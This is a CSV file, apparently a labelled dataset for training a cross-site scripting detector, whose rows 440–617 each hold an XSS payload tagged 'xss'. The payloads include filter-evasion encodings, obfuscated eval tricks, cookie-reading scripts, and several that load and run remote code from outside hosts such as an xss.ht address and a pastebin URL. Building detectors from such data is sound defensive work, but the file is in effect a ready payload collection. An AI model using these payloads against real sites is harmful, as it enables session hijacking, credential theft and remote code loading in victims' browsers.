index,input,category,labels
440,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
",xss,1
441,"<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
",xss,1
442,"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
",xss,1
443,"<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
",xss,1
444,"<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
",xss,1
445,"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
",xss,1
446,"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
",xss,1
447,"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
",xss,1
448,"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
",xss,1
449,"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
",xss,1
450,"<a target=""x"" href=""xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
",xss,1
451,"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
",xss,1
452,"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
",xss,1
453,"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>
",xss,1
454,"<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
",xss,1
455,"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">
",xss,1
456,"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>
",xss,1
457,"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?
",xss,1
458,"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">?
",xss,1
459,"<var onmouseover=""prompt(1)"">On Mouse Over</var>?
",xss,1
460,"<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
",xss,1
461,"<img src=""/"" =_="" title=""onerror='prompt(1)'"">
",xss,1
462,"<%<!--'%><script>alert(1);</script -->
",xss,1
463,"<script src=""data:text/javascript,alert(1)""></script>
",xss,1
464,"<iframe/src \/\/onload = prompt(1)
",xss,1
465,"<iframe/onreadystatechange=alert(1)
",xss,1
466,"<svg/onload=alert(1)
",xss,1
467,"<input value=<><iframe/src=javascript:confirm(1)
",xss,1
468,"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>
",xss,1
469,"http://www.<script>alert(1)</script .com
",xss,1
470,"<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
",xss,1
471,"<svg><script ?>alert(1)
",xss,1
472,"<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
",xss,1
473,"<img src=`xx:xx`onerror=alert(1)>
",xss,1
474,"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>
",xss,1
475,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?
",xss,1
476,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click
",xss,1
477,"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>?
",xss,1
478,"<svg contentScriptType=text/vbs><script>MsgBox+1
",xss,1
479,"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a
",xss,1
480,"<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
",xss,1
481,"<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
",xss,1
482,"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F
",xss,1
483,"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
",xss,1
484,"<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
",xss,1
485,"<script>+-+-1-+-+alert(1)</script>
",xss,1
486,"<body/onload=&lt;!--&gt;&#10alert(1)>
",xss,1
487,"<script itworksinallbrowsers>/*<script* */alert(1)</script ?
",xss,1
488,"<img src ?itworksonchrome?\/onerror = alert(1)???
",xss,1
489,"<svg><script>//&NewLine;confirm(1);</script </svg>
",xss,1
490,"<svg><script onlypossibleinopera:-)> alert(1)
",xss,1
491,"<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
",xss,1
492,"<script x> alert(1) </script 1=2
",xss,1
493,"<div/onmouseover='alert(1)'> style=""x:"">
",xss,1
494,"<--`<img/src=` onerror=alert(1)> --!>
",xss,1
495,"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
",xss,1
496,"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?
",xss,1
497,"""><img src=x onerror=window.open('https://www.google.com/');>
",xss,1
498,"<form><button formaction=javascript&colon;alert(1)>CLICKME
",xss,1
499,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click
",xss,1
500,"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
",xss,1
501,"<iframe  src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>
",xss,1
502,"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>
",xss,1
503,"""><img src=x onerror=prompt(1);>
",xss,1
504,": \');confirm(1);//
",xss,1
505,"<x/onmouSeenter=window[`\x61\x6c\x65\x72\x74`]`1337`
",xss,1
506,"<script>prompt(1)</script> 
",xss,1
507,"<script>confirm(1)</script>
",xss,1
508,"<script>var fn=window[490837..toString(1<<5)];     fn(atob('YWxlcnQoMSk='));</script>  
",xss,1
509,"<script>var fn=window[String.fromCharCode(101,118,97,108)];     fn(atob('YWxlcnQoMSk='));</script> 
",xss,1
510,"<script>var fn=window[atob('ZXZhbA==')];fn(atob('YWxlcnQoMSk='));    </script>
",xss,1
511,"<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>     <script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>     <script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])</script>     <script>this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))</script> 
",xss,1
512,"<script>'str1ng'.replace(/1/,alert)</script>     <script>'bbbalert(1)cccc'.replace(/a\w{4}\(\d\)/,eval)</script>     <script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/,function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script> 
",xss,1
513,"<script>eval('\\u'+'0061'+'lert(1)')</script>     <script>throw~delete~typeof~prompt(1)</script>     <script>delete[a=alert]/prompt a(1)</script>     <script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>     <script>(()=>{return this})().alert(1)</script>    
",xss,1
514,"<script>new function(){new.target.constructor('alert(1)')();}</script>     <script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script> 
",xss,1
515,"<link/rel=prefetch import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
",xss,1
516,"<link rel=""import"" href=""data:x,<script>alert(1)</script>     <script>Array.from1${alert}3${window}2</script>     
",xss,1
517,"<script>!{x(){alert(1)}}.x()</script>     <script>Array.from${eval}alert\1\``</script>     <script>Array.from([1],alert)</script>     <script>Promise.reject(""1"").then(null,alert)</script>     
",xss,1
518,"<svg </onload =""1> (_=alert,_(1)) """">     
",xss,1
519,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>  
",xss,1
520,"<marquee loop=1 width=0 onfinish=alert(1)>
",xss,1
521,"<p onbeforescriptexecute=""alert(1)""><svg><script>\</p>     
",xss,1
522,"<img onerror=alert(1) src <u></u>     <videogt;<source onerror=javascript:prompt(911)gt;     
",xss,1
523,"<base target=""<script>alert(1)</script>""><a href=""javascript:name"">CLICK</a>     
",xss,1
524,"<base href=""javascript:/""><a href=""**/alert(1)""><base href=""javascript:/""><a href=""**/alert(1)"">     
",xss,1
525,"<style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)> <     
",xss,1
526,"<script>
",xss,1
527,"${``[class extends[alert``]{}]}
",xss,1
528,"</script>     <script>[class extends[alert``]{}]</script>     
",xss,1
529,"<script>throw new class extends Function{}('alert(1)')``</script>     <script>x=new class extends Function{}('alert(1)'); x=new x;</script>     <script>new class extends alert(1){}</script> 
",xss,1
530,"<script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>     
",xss,1
531,"<script>new Image()[unescape('%6f%77%6e%65%72%44%6f%63%75%6d%65%6e%74')][atob('ZGVmYXVsdFZpZXc=')][8680439..toString(30)](1)</script>     <script src=data:,\u006fnerror=\u0061lert(1)></script>     
",xss,1
532,"""><svg><script/xlink:href=""data:,alert(1)     <svg><script/xlink:href=data:,alert(1)></script>     <frameset/onpageshow=alert(1)>     
",xss,1
533,"<div onactivate=alert('Xss') id=xss style=overflow:scroll>     
",xss,1
534,"<div onfocus=alert('xx') id=xss style=display:table>
",xss,1
535,"""><script src=https://hackeroneofjaaah.xss.ht></script>
",xss,1
536,"javascript:eval('var a=document.createElement(\'script\');a.src=\'https://hackeroneofjaaah.xss.ht\';document.body.appendChild(a)')
",xss,1
537,"""><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFja2Vyb25lb2ZqYWFhaC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
",xss,1
538,"""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFja2Vyb25lb2ZqYWFhaC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
",xss,1
539,"""><iframe srcdoc=""&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;hackeroneofjaaah.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"">
",xss,1
540,"<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(""load"", b);a.open(""GET"", ""//hackeroneofjaaah.xss.ht"");a.send();</script>
",xss,1
541,"<script>$.getScript(""//hackeroneofjaaah.xss.ht"")</script>
",xss,1
542,"><object+data=//14.rs>
",xss,1
543,"><script src=//pastebin.com/raw/WDWWYaLA></script>
",xss,1
544,"<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
",xss,1
545,"</script><svg><script>alert(1)-%26apos%3B
",xss,1
546,"anythinglr00</script><script>alert(document.domain)</script>uxldz
",xss,1
547,"anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
",xss,1
548,"<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
",xss,1
549,"<svg onload\r\n=$.globalEval(""al""+""ert()"");>
",xss,1
550,"?""></script><base%20c%3D=href%3Dhttps:\mysite>
",xss,1
551,"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
",xss,1
552,"<a href=javas&#99;ript:alert(1)>
",xss,1
553,"<Img src = x onerror = ""javascript: window.onerror = alert; throw XSS"">
",xss,1
554,"<Video> <source onerror = ""javascript: alert (XSS)"">
",xss,1
555,"<Input value = ""XSS"" type = text>
",xss,1
556,"<applet code=""javascript:confirm(document.cookie);"">
",xss,1
557,"<isindex x=""javascript:"" onmouseover=""alert(XSS)"">
",xss,1
558,"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
",xss,1
559,"""><img src=""x:x"" onerror=""alert(XSS)"">
",xss,1
560,"""><iframe src=""javascript:alert(XSS)"">
",xss,1
561,"<object data=""javascript:alert(XSS)"">
",xss,1
562,"<isindex type=image src=1 onerror=alert(XSS)>
",xss,1
563,"<img src=x:alert(alt) onerror=eval(src) alt=0>
",xss,1
564,"<img  src=""x:gif"" onerror=""window['al\u0065rt'](0)""></img>
",xss,1
565,"<iframe/src=""data:text/html,<svg onload=alert(1)>"">
",xss,1
566,"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>
",xss,1
567,"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
",xss,1
568,"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">
",xss,1
569,"<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
",xss,1
570,"<form><a href=""javascript:\u0061lert(1)"">X
",xss,1
571,"</script><img/*%00/src=""worksinchrome&colon;prompt(1)""/%00*/onerror='eval(src)'>
",xss,1
572,"<style>//*{x:expression(alert(/xss/))}//<style></style>
",xss,1
573,"On Mouse Over​
",xss,1
574,"<img src=""/"" =_="" title=""onerror='prompt(1)'"">
",xss,1
575,"<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
",xss,1
576,"<script x> alert(1) </script 1=2
",xss,1
577,"<form><button formaction=javascript&colon;alert(1)>CLICKME
",xss,1
578,"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""
",xss,1
579,"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>
",xss,1
580,"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>
",xss,1
581,"<iframe srcdoc=""&lt;svg/onload=alert()&gt;"">
",xss,1
582,"</script><svg><script>alert(1)-%26apos%3B
",xss,1
583,"anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
",xss,1
584,"<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
",xss,1
585,"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
",xss,1
586,"<a href=javas&#99;ript:alert(1)>
",xss,1
587,"
",xss,1
588,"javascript:alert(""OfJAAH""):
",xss,1
589,"<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
",xss,1
590,"<d3v/onauxclick=[2].some(confirm)>click
",xss,1
591,"<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
",xss,1
592,"{1==1}""><object+data=javascript%26colon%3b'str1ng'.replace('1',alert)>
",xss,1
593,"'><img src=x onError=prompt(""OpenBugBounty"")>
",xss,1
594,"'><img+sRc=l+oNerrOr=prompt(document.cookie)+x>
",xss,1
595,"""><object+data=javascript%26%63%6f%6c%6f%6e%3b'straccessng'.replace('access',alert)>
",xss,1
596,"<svg/ \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
",xss,1
597,"<svg/ subsoloprivxss \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
",xss,1
598,"<script>x = '<!--<script>'/*</script>-->*/;alert(1)</script
",xss,1
599,"<svg onload=""import('data:text/javascript,al'+''+'ert(0)')"">
",xss,1
600,"<image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
",xss,1
601,"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">
",xss,1
602,"<</p>iframe src=javascript:alert()//
",xss,1
603,"<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
",xss,1
604,"<head></head><body>padding<bleh onclick=""top[/al/.source+/ert/.source]	``"">clickpadding</bleh></body>
",xss,1
605,"<details onauxclick=confirm`xss`></details>
",xss,1
606,"<frameset onpageshow=alert(1)>
",xss,1
607,"<svg onunload=http://window.open ('javascript:alert(1)')>
",xss,1
608,"<xss class=progress-bar-animated onanimationstart=alert(1)>
",xss,1
609,"<xss<script>>&28;prompt();&28;<</script>/xss>
",xss,1
610,"<svg><b><style><img id=""&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;"">
",xss,1
611,"<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
",xss,1
612,"<svg%0Aonauxclick=0;[1].some(confirm)//
",xss,1
613,"<</div>script</div>>alert()<</div>/script</div>>
",xss,1
614,"<svg onload=alert(1)>
",xss,1
615,"""><svg onload=alert(1)>
",xss,1
616,"</tag><svg onload=alert(1)>
",xss,1
617,"""></tag><svg onload=alert(1)>
",xss,1
